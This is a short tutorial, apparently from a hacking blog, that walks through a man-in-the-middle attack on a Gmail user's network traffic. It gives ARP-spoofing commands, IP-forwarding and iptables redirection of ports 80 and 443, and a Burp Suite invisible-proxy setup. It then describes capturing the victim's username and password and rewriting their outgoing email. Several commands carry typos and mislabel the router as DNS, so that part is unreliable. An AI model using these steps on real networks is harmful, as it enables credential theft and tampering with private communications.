@@ -1,0 +1,54 @@
+
+Hijacking Gmail Message on Air using Burpsuite
+
+There are various vibrant attacks of burpsuite that many not know off; therefore we will try one for those in this article today. We will learn how to get between the networks of gmail and then to change the message o the mail before it reaches receiver.
+First of all, go to the terminal of Kali and type:
+arspoof -i wlan0 -t 192.168.100.4 192.168.100.1
+Here,
+-i –> interface
+wlan0 –> network (This can be either ethernet or wlan depending on your victim i.e. if your victim is using eth0 then you should also use eth0)
+-t –> target
+192.168.100.4 –> Victim IP
+192.168.100.1 –> DNS
+
+Execution of the above command will capture the packets that are sent from victim to router. And once we have captured these packets we will open another terminal in Kali and type the following command which will make us capture all the packets from router to victim.
+arpspoof -i wlan0 -t 192.168.100.1 192.168.100.4
+Here,
+-i –> interface
+wlan0 –> network
+-t –> target
+192.168.100.1 –> DNS
+192.168.100.4 –> victim IP
+
+This command will capture packets that are sent from router to victim IP. Now type the following the command so that IP forwarding is enabled in our PC.
+echo 1 > /proc/sys/net/ipv4/ip_forward
+Then type the following the command so that all the packets on port 80 will go through our IP.
+iptables -t nat -A PREROUTING -p tcp –dport 80 -j DNAT –to -desitination 192.168.100.5
+Then type the following the command so that we can all the packets on port 443 will go from our IP.
+iptables -t nat -A PREROUTING -p tcp –dport 443 -j DNAT –to -desitination 192.168.100.5
+
+After all this is done then open burpsuite and go to proxy tab and then select options tab. Once you have reached here click on Add button.
+
+Clicking on Add button will make the following options appear. In this give port no 80 in the box adjacent to bind to port and in specific address give your IP.
+
+Further on, Select Request Handling tab and check Support invisible proxy. And then click on ok.
+
+Repeat the above steps for Port no 443 too.
+
+After clicking on ok make sure all the boxes of running and invisible are check.
+
+When the victim will sign in his/her gmail account we have its data captured in burpsuite.
+
+And all this captured data will contain username and password of the victim as shown below.
+
+Here is the closer view to the username and password.
+
+The victim will type and send the message without suspicion:
+
+But as the victim will click on send button its mail will come to us before reaching destination.
+
+Now you can change the text of the message by a simple left click on the message area and type your message as I changed HELLO THIS IS TESTING to YOU HAVE BEEN HACKED.
+
+Once you change the message then click on Forward button on the top left side and the mail will go forward to its destination as shown below:
+
+Shivam Gupta is An Ethical Hacker, Cyber Security Expert, Penetration Tester, India. you can contact here
